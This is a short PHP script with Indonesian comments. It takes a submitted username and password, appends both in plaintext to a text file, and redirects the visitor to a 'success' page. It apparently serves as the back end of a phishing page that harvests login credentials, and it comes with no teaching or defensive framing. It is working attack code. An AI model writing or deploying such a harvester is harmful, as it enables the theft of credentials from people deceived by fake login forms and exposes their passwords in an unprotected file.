<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Variable setting
    $username = $_POST['u_name'];  // Ambil username
    $passcode = $_POST['pass'];    // Ambil password

    // Simpan data ke dalam berkas data.txt
    $fileContent = "Username: $username\r\nPassword: $passcode\r\n";
    $file = fopen("data.txt", "a"); // Membuka berkas data.txt untuk penulisan
    if ($file) {
        fwrite($file, $fileContent); // Menulis data ke berkas
        fclose($file); // Menutup berkas 
        header("Location: berhasil.html");
        exit();
    } else {
        echo "Gagal menyimpan data ke dalam berkas.";
    }
}
?>
